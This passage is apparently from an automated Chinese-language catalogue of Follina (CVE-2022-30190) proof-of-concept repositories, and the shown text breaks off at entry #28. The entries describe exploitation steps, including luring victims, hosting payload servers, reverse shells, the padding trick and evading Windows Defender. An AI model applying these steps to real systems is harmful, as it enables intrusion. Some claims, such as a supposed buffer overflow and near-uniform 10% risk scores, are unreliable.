3.  **远程模板注入：** 恶意文档利用Word的远程模板功能，从远程服务器检索HTML文件。该HTML文件中包含恶意的JavaScript代码。
4.  **代码执行：** 嵌入在HTML中的JavaScript代码构造一个MSDT协议URL，该URL利用`PCWDiagnostic`参数来执行任意命令。
5.  **有效性：** 提供的Python脚本 `payload.py` 用于生成包含恶意命令的HTML payload。脚本首先将要执行的命令进行Base64编码，然后将其嵌入到一个特制的HTML脚本中，该脚本利用了`ms-msdt:` 协议。该POC代码看起来是有效的，可以生成利用此漏洞的payload。
6.  **投毒风险：** 提供的POC仓库主要包含生成Payload的脚本，脚本目的是使用Invoke-Expression执行base64编码的命令,虽然脚本本身没有明显的恶意代码，但存在以下投毒风险：
    * 依赖风险：Payload生成脚本依赖base64编码技术，攻击者有可能通过修改解码后的命令来实现恶意行为。
    * 载荷风险：Payload最终会执行PowerShell命令，这为执行恶意载荷提供了机会。攻击者可以嵌入各种恶意代码，如反向Shell、文件下载执行等。
    * 脚本来源风险： 虽然脚本声称来源于JohnHammond的GitHub仓库，但是有被篡改的风险，需要人工审核确认。
    因此，综合评估，该仓库中存在一定投毒风险, 估计占比10%。主要风险集中在使用者在使用payload时可能引入恶意代码。
7.  **缓解措施：**
    *   禁用MSDT URL协议。
    *   安装Microsoft提供的安全更新。
    *   使用威胁检测工具来识别和阻止利用此漏洞的攻击。

总体而言，CVE-2022-30190是一个严重的安全漏洞，攻击者可以利用它在受影响的系统上执行任意代码。用户应尽快采取措施来缓解此漏洞带来的风险。

**项目地址:** [alien-keric/CVE-2022-30190](https://github.com/alien-keric/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #17

**来源**: [CVE-2022-30190-aminetitrofine_CVE-2022-30190.md](../2022/CVE-2022-30190-aminetitrofine_CVE-2022-30190.md)

## CVE-2022-30190 (Follina) - Microsoft MSDT远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，获取系统控制权

**影响版本:** 受影响的Windows版本包括但不限于Windows 7, Windows 8.1, Windows 10, Windows 11, Windows Server 2008 R2, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022，具体版本范围请参考漏洞库信息。

**利用条件:** 需要用户打开包含恶意代码的Word文档或其他调用MSDT的应用程序。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个Microsoft MSDT远程代码执行漏洞。攻击者可以利用Word等应用程序通过URL协议调用MSDT来执行任意代码。漏洞利用过程大致如下：

1.  攻击者创建一个包含恶意链接的Word文档或其他支持URL协议调用MSDT的文档。
2.  当受害者打开该文档时，Word会尝试通过URL协议调用MSDT。
3.  恶意URL指向攻击者控制的服务器，服务器返回包含恶意代码的HTML页面。
4.  MSDT执行HTML页面中的恶意代码，从而实现远程代码执行。

根据提供的漏洞利用代码`follina.py`，该脚本可以生成包含恶意引用的Word文档，指向攻击者控制的HTTP服务器。HTTP服务器提供包含恶意代码的HTML文件，当受害者打开Word文档时，MSDT将执行此代码。

**有效性：** 提供的POC代码 `follina.py` 看起来有效，可以生成包含恶意代码的Word文档，并通过HTTP服务器提供payload。通过命令行参数可以指定要执行的命令（例如calc.exe或notepad.exe），或者获取反向shell。

**投毒风险：** `follina.py` 代码本身主要功能是利用漏洞，生成包含恶意代码的文档和提供payload。但值得注意的是，如果使用反向shell功能（`-r` 参数），代码会尝试从GitHub下载 `nc64.exe` (Netcat) 并将其放置在受害者系统的 `C:\Windows\Tasks` 目录下。这本身不是投毒行为，而是exploit的一部分，目的是为了建立反向连接。 但从Github下载的netcat二进制文件来源是否安全需要考虑，存在一定的供应链风险。仓库中的README.md文件描述中使用的下载链接也需要验证安全性。

综合考虑，认为该仓库存在一定程度的投毒风险，但主要来自于供应链风险和exploit本身行为引入的风险，而非作者恶意植入的后门，因此投毒风险评估为10%。

**利用方式：**

1.  **生成恶意文档：** 使用 `follina.py` 脚本生成包含恶意链接的Word文档（或其他支持的文档）。
2.  **搭建HTTP服务器：** 运行 `follina.py` 脚本会启动一个HTTP服务器，用于提供恶意HTML payload。
3.  **诱骗受害者打开文档：** 通过电子邮件、社交媒体或其他方式将恶意文档发送给受害者，诱骗其打开。
4.  **执行任意代码：** 受害者打开文档后，MSDT会执行HTTP服务器提供的恶意代码，从而实现远程代码执行。攻击者可以执行任意命令，安装恶意软件，窃取数据等。

**项目地址:** [aminetitrofine/CVE-2022-30190](https://github.com/aminetitrofine/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #18

**来源**: [CVE-2022-30190-ar2o3_FollinaXploit.md](../2022/CVE-2022-30190-ar2o3_FollinaXploit.md)

## CVE-2022-30190-Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，系统被完全控制

**影响版本:** 受影响的Windows版本范围广泛，包括Windows 7至Windows 11及多个Server版本，详见漏洞库信息。

**利用条件:** 用户需要打开包含恶意链接或文档（如Word文档）的应用程序。攻击依赖于MSDT通过URL协议被调用。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过精心构造的恶意文档，诱使用户打开，该文档利用Word的远程模板功能从远程服务器检索HTML文件，通过MSDT协议执行任意代码。该漏洞的利用方式是：

1.  **攻击者创建一个恶意的Word文档或其他支持远程模板的文档。**
2.  **该文档包含一个指向恶意服务器的链接，用于下载一个HTML文件。**
3.  **当用户打开该文档时，Word会尝试从远程服务器下载HTML文件。**
4.  **HTML文件包含恶意的JavaScript代码，该代码使用`ms-msdt:`协议调用MSDT，并执行任意命令。**
5.  **攻击者利用MSDT的漏洞执行系统命令，实现远程代码执行。**

**有效性评估：**
根据漏洞库信息和搜索结果，此漏洞利用的有效性较高，已被积极利用。

**投毒风险：**
提供的漏洞利用代码只包含GNU GPL协议的许可证，属于开源协议声明，不具备实际的漏洞利用代码。无法直接用于评估是否存在后门或恶意代码。但考虑到实际漏洞利用中可能存在复杂的攻击链，且攻击者可能修改或添加额外的恶意代码，仍然存在一定的投毒风险。此处预估投毒风险为10%，主要考虑实际利用中攻击者可能的定制行为。

**搜索引擎结果补充：** 搜索引擎结果中提到漏洞利用需要调用URL协议和MSDT。同时，参考 Qualys 的博客，表明此漏洞影响范围广泛。Arctic Wolf的博客也指出此漏洞已经被积极利用。这些都增加了漏洞利用的有效性评估。


**项目地址:** [ar2o3/FollinaXploit](https://github.com/ar2o3/FollinaXploit)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #19

**来源**: [CVE-2022-30190-arozx_CVE-2022-30190.md](../2022/CVE-2022-30190-arozx_CVE-2022-30190.md)

## CVE-2022-30190-Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在受害者系统上执行任意代码

**影响版本:** 见漏洞库信息中的受影响版本列表

**利用条件:** 用户需要打开恶意Word文档或点击恶意链接

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190 (Follina) 是一个 Microsoft Office 漏洞，当从 Word 等调用应用程序中使用 URL 协议调用 MSDT 时，存在远程代码执行漏洞。攻击者可以利用此漏洞在受害者系统上执行任意代码。根据提供的PoC代码，攻击方式主要通过构造恶意的HTML文件（exploit.html），该文件包含大量的 'A' 字符，可能用于缓冲区溢出或其他内存破坏技术，从而执行恶意代码。该HTML文件需要通过Word的远程模板功能从远程服务器检索。server.py脚本可能用于托管该恶意HTML文件。漏洞利用有效性较高，因为该漏洞已被公开利用并添加到 CISA KEV 目录。投毒风险评估为10%。因为攻击者可能通过服务器端植入后门，但是该后门不是通过PoC直接表现，需要攻击者自身行为才能形成。 

**利用方式：**

1.  攻击者创建一个包含恶意链接或嵌入恶意HTML的Word文档。
2.  当用户打开该文档时，Word会尝试通过MSDT URL协议加载远程HTML文件。
3.  恶意HTML文件利用MSDT漏洞执行任意代码，例如下载并执行恶意程序，或直接在受害者系统上执行命令。

**项目地址:** [arozx/CVE-2022-30190](https://github.com/arozx/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #20

**来源**: [CVE-2022-30190-drgreenthumb93_CVE-2022-30190-follina.md](../2022/CVE-2022-30190-drgreenthumb93_CVE-2022-30190-follina.md)

## CVE-2022-30190-Follina

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许远程代码执行，可完全控制受害者系统

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 用户需要打开包含恶意链接或文档的应用程序（如Word），需要用户交互。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-30190（Follina）是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过诱使用户打开恶意构造的Word文档或其他支持URL协议的应用程序来利用此漏洞。该文档会利用Word的远程模板功能从远程Web服务器检索HTML文件，HTML文件中包含恶意的JavaScript代码。该JavaScript代码使用`ms-msdt:` URL协议调用MSDT，并传递恶意的命令参数，导致MSDT执行任意代码。PoC代码通过修改`word\rels\document.xml.rels`文件中的目标IP来指定恶意HTML文件的位置。`bad.html`文件包含大量的填充字符，之后是恶意JavaScript代码。攻击者需要确保在`window.location.href`之前至少有3541个字符，并且这些字符必须在`<script>`标签内。PoC的README提到Windows Defender可能会检测到此漏洞（Trojan:Win32/Mesdetty.D），因此可能需要编辑PoC文件以绕过检测。根据提供的代码和信息，没有发现作者有意添加的投毒代码。

**项目地址:** [drgreenthumb93/CVE-2022-30190-follina](https://github.com/drgreenthumb93/CVE-2022-30190-follina)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #21

**来源**: [CVE-2022-30190-ethicalblue_Follina-CVE-2022-30190-Sample.md](../2022/CVE-2022-30190-ethicalblue_Follina-CVE-2022-30190-Sample.md)

## CVE-2022-30190 - Microsoft MSDT "Follina" RCE

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的多个Windows版本，详见漏洞库信息

**利用条件:** 用户需要打开包含恶意链接或文件的应用程序（例如Word）。攻击通常通过诱骗用户打开恶意文档触发。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-30190，又名"Follina"，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。该漏洞允许攻击者通过MSDT URL协议，从调用应用程序（如Microsoft Word）执行任意代码。攻击者通常会制作恶意的Word文档或RTF文件，其中包含指向恶意HTML文件的链接。当用户打开文档时，Word会通过MSDT协议加载HTML文件，从而导致恶意代码执行。

**漏洞利用方式：**

1.  **诱骗用户打开恶意文档：** 攻击者通过电子邮件、网络钓鱼或其他方式，诱骗用户打开特制的Word文档或RTF文件。
2.  **文档包含恶意链接：** 该文档包含一个指向远程服务器上托管的恶意HTML文件的链接，通常使用`ms-msdt:/`协议触发。
3.  **利用MSDT执行代码：** 当Word尝试打开链接时，会调用MSDT，并执行HTML文件中嵌入的恶意代码，最终实现远程代码执行。

**POC分析：**

提供的POC代码包含以下文件：

*   `App.xaml` 和 `App.xaml.cs`: 定义WPF应用程序的入口点和资源。
*   `AssemblyInfo.cs`: 包含程序集的元数据，例如主题信息。
*   `FollinaExtractor.cs`:  包含用于从受感染的Word文档（.docx）或RTF文件中提取恶意链接的代码。它解析`word/_rels/document.xml.rels`文件以查找`Target="mhtml:`开头的字符串，或RTF文件寻找恶意链接，从而提取恶意MHTML链接。
*   `Follina_PoC.csproj`:  定义项目设置，例如目标框架和使用的WPF。

此POC代码用于分析和提取Follina漏洞相关的恶意URL，不包含直接执行恶意代码的部分，是一个分析工具。

**投毒风险评估：**

此仓库的主要功能是提取已知的漏洞利用代码。通过检查`FollinaExtractor.cs`，我们可以确定它主要用于读取文件内容并搜索特定的字符串模式。因此，该仓库的作者可以通过隐藏在不太明显的地方的代码（例如，通过引入额外的库或修改现有的解析逻辑），在提取过程中执行一些额外的操作（例如，记录提取的URL，收集系统信息等）。但是，由于其主要功能是分析文件，因此恶意代码的插入点有限。投毒风险较低。
基于漏洞利用代码的分析，我们认为该仓库存在投毒风险的可能性为5%。大部分代码都是标准WPF应用程序结构和字符串解析功能。

**项目地址:** [ethicalblue/Follina-CVE-2022-30190-Sample](https://github.com/ethicalblue/Follina-CVE-2022-30190-Sample)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #22

**来源**: [CVE-2022-30190-hycheng15_CVE-2022-30190.md](../2022/CVE-2022-30190-hycheng15_CVE-2022-30190.md)

## CVE-2022-30190 - Microsoft MSDT RCE (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本包括Windows 7 SP1到Windows 11 21H2，具体版本范围见漏洞库信息。

**利用条件:** 用户需要打开恶意的Word文档。攻击者需要能够托管一个HTTP服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞 (CVE-2022-30190)，又名Follina，是由于MSDT处理URL协议不当造成的远程代码执行漏洞。攻击者可以构造一个恶意的Word文档，其中包含指向远程HTTP服务器的链接。当用户打开文档时，Word会使用MSDT通过URL协议去请求远程HTML文件。这个HTML文件包含恶意的JavaScript代码，用于执行任意命令。

**有效性：** 提供的POC代码是有效的。该代码通过以下步骤利用漏洞：

1.  创建一个恶意的Word文档，其中包含指向攻击者控制的HTTP服务器的链接。
2.  托管一个HTTP服务器，该服务器提供包含恶意JavaScript代码的HTML文件。
3.  当受害者打开Word文档时，MSDT会尝试连接到攻击者的服务器并执行恶意代码。

**投毒风险：** 存在一定的投毒风险 (10%)。

*   `folina.py`脚本本身看起来是合法的漏洞利用代码，但需要仔细检查其依赖项和网络行为。
*   虽然主要功能集中在生成漏洞利用文件和搭建HTTP服务，但仍需审查脚本中是否存在任何潜在的恶意行为，例如未记录的数据传输或额外的文件操作。
*  脚本中从github下载`nc64.exe`，如果github上的文件被替换为恶意程序，则存在被投毒风险。

**利用方式：**

1.  攻击者创建一个恶意的Word文档 (`follina.doc`)，其中包含指向远程服务器上托管的HTML文件的链接。
2.  攻击者搭建一个HTTP服务器，托管包含恶意JavaScript代码的HTML文件 (`index.html`)。这个HTML文件使用`ms-msdt:`协议触发MSDT，并执行payload。
3.  攻击者诱骗受害者打开恶意的Word文档。
4.  Word文档加载远程HTML文件，触发MSDT，从而在受害者系统上执行任意代码。

POC代码使用python编写，主要步骤如下：

*   **环境准备:**
    *   搭建Windows虚拟机(推荐Win10 21H2)，并安装Microsoft Word 2013及Python 3.8.10。
    *   关闭Windows的病毒和威胁防护。
    *   使用`pip install netifaces`安装依赖。
*   **漏洞利用：**
    *   运行`folina.py`脚本，指定监听IP地址和端口。示例：`py folina.py -i <ip-address>`
    *   脚本会生成一个恶意的Word文档 (follina.doc)，并在指定的IP地址和端口上启动一个HTTP服务器。
    *   诱骗目标用户打开该Word文档，即可触发漏洞，执行计算器程序或反弹shell。

**项目地址:** [hycheng15/CVE-2022-30190](https://github.com/hycheng15/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #23

**来源**: [CVE-2022-30190-komomon_CVE-2022-30190-follina-Office-MSDT-Fixed.md](../2022/CVE-2022-30190-komomon_CVE-2022-30190-follina-Office-MSDT-Fixed.md)

## CVE-2022-30190-Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，安装程序，查看、更改或删除数据，或在用户权限允许的上下文中创建新帐户

**影响版本:** 受影响的Windows版本：Windows 7 SP1, Windows 8.1, Windows Server 2008 R2 SP1, Windows Server 2012, Windows Server 2012 R2, Windows 10 (所有版本), Windows 11, Windows Server 2016, Windows Server 2019, Windows Server 2022。 具体版本范围请参考漏洞库信息。

**利用条件:** 需要用户打开恶意的Word文档或其他调用MSDT的应用程序。攻击者需要诱骗用户执行恶意操作。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞。攻击者可以通过构造恶意的Word文档或其他调用MSDT的应用程序，利用URL协议调用MSDT来执行任意代码。该漏洞的利用方式是，恶意文档利用Word的远程模板功能从远程web服务器检索HTML文件，该HTML文件包含执行恶意代码的指令。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意链接的Word文档或其他可以调用MSDT的应用程序。
2.  该恶意链接指向攻击者控制的服务器，该服务器托管一个包含恶意代码的HTML文件。
3.  当受害者打开文档时，Word会尝试从远程服务器加载HTML文件。
4.  HTML文件利用ms-msdt协议触发MSDT，从而执行嵌入的恶意代码。
5.  恶意代码在受害者的计算机上执行，赋予攻击者控制受害者系统的能力。

**投毒风险分析：**

提供的Python POC代码主要功能是生成包含漏洞利用的恶意Word文档。 代码通过修改docx文档的`word/_rels/document.xml.rels`文件，将文档中的链接重定向到恶意服务器。  此外，代码还会修改`word/document.xml`添加OLEObject。

虽然代码本身实现了漏洞利用，但潜在的投毒风险主要在于以下几个方面：

*   **恶意服务器：**  POC代码依赖于攻击者控制的服务器来托管payload。 如果攻击者在服务器端放置了更具破坏性的payload，例如勒索软件或其他恶意软件，则利用此POC的用户可能会意外地分发这些恶意软件。
*   **生成的文档：**  生成的docx文档本身就是恶意文件。如果用户不小心将包含后门的恶意文档分享给其他人，可能会造成进一步的危害，但这不是代码投毒，而是漏洞本身的利用效果。

代码中直接包含恶意后门的概率较低，但用户需要警惕使用该POC可能带来的间接风险，尤其是payload服务器的安全性。 此处将投毒概率评估为10%，主要考虑的是payload服务器被恶意利用的可能性，而非代码本身存在后门。

**项目地址:** [komomon/CVE-2022-30190-follina-Office-MSDT-Fixed](https://github.com/komomon/CVE-2022-30190-follina-Office-MSDT-Fixed)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #24

**来源**: [CVE-2022-30190-mattjmillner_CVE-Smackdown.md](../2022/CVE-2022-30190-mattjmillner_CVE-Smackdown.md)

## CVE-2022-30190 - Microsoft MSDT 远程代码执行

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本（见漏洞库信息）

**利用条件:** 需要用户打开恶意文档（例如Word文档）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个远程代码执行漏洞，存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中。攻击者可以利用该漏洞通过调用应用程序(例如Microsoft Word)以URL协议的方式执行任意代码。攻击者通常会创建一个恶意的Word文档，该文档利用Word的远程模板功能从远程Web服务器检索一个HTML文件，该HTML文件包含恶意代码，从而触发MSDT执行任意命令。

**有效性:**
根据搜索结果，该漏洞是真实存在的，并且已被积极利用。漏洞库信息和搜索结果都确认了其存在和影响。

**投毒风险:**
提供的POC代码 `/tmp/64676d48ed786b898eab15332ce05bd0/README.md`  仅仅包含一个README.md文件，其中写着“Hello this is where we will conduct nefarious activities”。
这本身不是利用代码，而只是一个占位符。
因此，直接从这个`README.md`文件判断投毒是不可能的。该仓库如果包含其他恶意利用载荷则具有投毒可能。
投毒风险评估为10%，因为无法直接从提供的代码判断是否存在恶意代码，但说明该仓库可能用于恶意目的。

**利用方式:**
1.  攻击者创建一个包含恶意链接或嵌入对象的文档（例如Word文档）。
2.  当受害者打开该文档时，MSDT通过URL协议被调用。
3.  MSDT执行攻击者指定的恶意代码，从而导致远程代码执行。
4.  攻击者可以利用此漏洞安装程序，查看、更改或删除数据，或创建新帐户，具体取决于用户的权限。

**项目地址:** [mattjmillner/CVE-Smackdown](https://github.com/mattjmillner/CVE-Smackdown)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #25

**来源**: [CVE-2022-30190-melting0256_Enterprise-Cybersecurity.md](../2022/CVE-2022-30190-melting0256_Enterprise-Cybersecurity.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，攻击者可以执行任意代码，控制受影响的系统

**影响版本:** 受影响的Windows版本众多，详情见漏洞库信息

**利用条件:** 需要用户打开包含恶意链接或文件的应用程序（如Word）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过利用URL协议从调用应用程序（例如Word）调用MSDT来触发此漏洞。攻击者可以创建一个包含恶意链接或文件的应用程序（例如Word文档），当用户打开该文件时，MSDT将被调用并执行攻击者指定的任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断此漏洞的POC代码是有效的。搜索引擎结果中包含了大量关于此漏洞的分析、利用和修复信息，证明了该漏洞的真实性和危害性。提供的Python脚本（follina.py）能够生成包含恶意代码的Word文档，该文档在被打开时可以触发MSDT并执行攻击者指定的命令。

**投毒风险：**
POC代码中存在一定程度的投毒风险。虽然该代码的主要目的是为了验证漏洞的存在和利用方式，但攻击者可以很容易地修改该代码，使其包含恶意功能，例如：

1.  **恶意命令执行：** `command` 参数允许攻击者指定要在目标系统上执行的任意命令。如果用户不小心使用了包含恶意命令的POC代码，可能会导致系统受到损害。
2.  **反向Shell：** `--reverse` 参数允许攻击者在目标系统上创建一个反向Shell，从而可以远程控制该系统。这是一种非常危险的功能，可能会导致严重的安全问题。
3. **下载恶意可执行文件**: POC代码中会尝试从Github下载nc.exe，github连接可能会指向其他恶意地址，从而下载恶意可执行文件

综合来看，该POC代码的投毒风险约为10%，主要来自于可能被篡改的命令和潜在的恶意链接。

**利用方式：**
此漏洞的利用方式如下：

1.  **生成恶意Word文档：** 使用提供的Python脚本（follina.py）生成包含恶意链接的Word文档。该脚本会创建一个临时的HTTP服务器，用于托管一个包含MSDT协议处理程序的HTML文件。
2.  **诱骗用户打开文档：** 通过电子邮件、社交媒体或其他方式，诱骗目标用户打开恶意Word文档。
3.  **触发漏洞：** 当用户打开Word文档时，Word会尝试加载HTML文件。HTML文件中的MSDT协议处理程序会被触发，导致MSDT执行攻击者指定的命令。
4.  **执行任意代码：** 攻击者可以利用此漏洞在目标系统上执行任意代码，例如安装恶意软件、窃取敏感数据或控制系统。

总而言之，CVE-2022-30190是一个高危漏洞，攻击者可以利用它在受影响的系统上执行任意代码。用户应尽快采取必要的安全措施，例如安装补丁或禁用MSDT协议处理程序，以防止受到攻击。

**项目地址:** [melting0256/Enterprise-Cybersecurity](https://github.com/melting0256/Enterprise-Cybersecurity)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #26

**来源**: [CVE-2022-30190-michealadams30_Cve-2022-30190.md](../2022/CVE-2022-30190-michealadams30_Cve-2022-30190.md)

## CVE-2022-30190-Microsoft MSDT RCE-Follina

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码，控制系统。

**影响版本:** 见漏洞库信息

**利用条件:** 需要用户打开恶意构造的文档或点击恶意链接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个Microsoft Office漏洞，攻击者通过Word等程序调用MSDT，并利用URL协议从远程Web服务器检索HTML文件。该HTML文件包含恶意代码，从而在受害者系统上执行任意命令。漏洞利用涉及诱使用户打开恶意构造的文档（例如，通过电子邮件附件）。

**有效性：**
提供的Python POC代码看起来是有效的，它生成恶意文档或利用方式，并设置一个Web服务器来托管payload。代码包含从用户收集必要信息（如目标IP、端口、文件扩展名等）的部分，并创建所需的文件结构，表明具有利用该漏洞的能力。

**投毒风险：**
代码中可能存在投毒风险。虽然代码的主要功能是生成漏洞利用所需的文件，但攻击者可能在以下方面进行投毒：

*   **Web服务器payload：** 托管在Web服务器上的实际payload可能包含恶意代码，不仅执行预期的命令，还执行其他恶意操作，例如安装后门、窃取敏感信息等。
*   **生成的文档：**  生成的文档本身可能包含超出漏洞利用范围的恶意内容。

因此，存在一定风险，但代码整体结构看似为生成漏洞利用文件，投毒风险较低，预估投毒风险为10%。

**利用方式：**
1.  攻击者创建一个恶意构造的Word文档（或其他支持的文档类型）。
2.  该文档包含一个链接或引用，指向攻击者控制的Web服务器上的一个HTML文件。
3.  当用户打开该文档时，Word会尝试通过MSDT和URL协议检索该HTML文件。
4.  恶意HTML文件包含执行任意代码的payload。
5.  该payload在受害者系统上执行，从而允许攻击者控制系统。

**项目地址:** [michealadams30/Cve-2022-30190](https://github.com/michealadams30/Cve-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #27

**来源**: [CVE-2022-30190-seinab-ibrahim_Follina-Vulnerability-CVE-2022-30190-Exploit-Analysis.md](../2022/CVE-2022-30190-seinab-ibrahim_Follina-Vulnerability-CVE-2022-30190-Exploit-Analysis.md)

## CVE-2022-30190 (Follina) Microsoft MSDT 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本包括但不限于Windows 7, Windows 8.1, Windows 10, Windows 11, Windows Server 2008 R2, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022

**利用条件:** 需要用户打开恶意构造的文档或URL，且MSDT需要被调用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。 

**有效性评估：**
根据漏洞库信息和搜索结果，此漏洞已得到确认，并且存在公开可用的PoC（Proof of Concept）代码。 搜索结果显示该漏洞被广泛讨论和利用，因此可以判断提供的PoC代码是有效的。 尽管提供的`README.md`文件仅仅是描述性的，但意味着完整的仓库中包含可利用的POC代码

**投毒风险分析：**
提供的漏洞利用代码只是一个 `README.md` 文件，主要描述了漏洞的分析和利用。 由于仅仅是描述性文件，无法从中直接判断是否存在投毒代码。但如果完整的仓库中存在其他恶意脚本，例如伪装成正常利用代码的后门，则存在投毒风险。根据文件内容，倾向于是一个教学和研究项目，投毒的可能性较低，因此判断投毒风险约为 10%。

**利用方式：**
1.  攻击者利用Microsoft Office (例如Word) 的远程模板功能。
2.  构造一个包含恶意链接的文档，该链接指向一个远程Web服务器。
3.  当用户打开该文档时，Word会从远程Web服务器检索HTML文件。
4.  该HTML文件包含恶意的MSDT协议URL，用于调用MSDT。
5.  MSDT被调用时，会执行攻击者预设的任意代码，从而实现远程代码执行。

**总结：**
CVE-2022-30190 (Follina) 是一个高危漏洞，利用简单，影响范围广。攻击者可以通过诱使用户打开恶意文档或URL来触发该漏洞。虽然提供的PoC文件本身不包含恶意代码，但仍需谨慎使用，并确保从可信来源获取完整的PoC代码。

**项目地址:** [seinab-ibrahim/Follina-Vulnerability-CVE-2022-30190-Exploit-Analysis](https://github.com/seinab-ibrahim/Follina-Vulnerability-CVE-2022-30190-Exploit-Analysis)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #28

**来源**: [CVE-2022-30190-shri142_ZipScan.md](../2022/CVE-2022-30190-shri142_ZipScan.md)

## CVE-2022-30190 (Follina) MSDT 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码，可能导致系统完全控制

**影响版本:** 受影响的Windows版本众多，具体版本范围请参考漏洞库信息

**利用条件:** 用户需要打开恶意构造的文档（如Word文档），或者点击恶意链接。调用程序（如Word）需要存在漏洞影响版本中。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

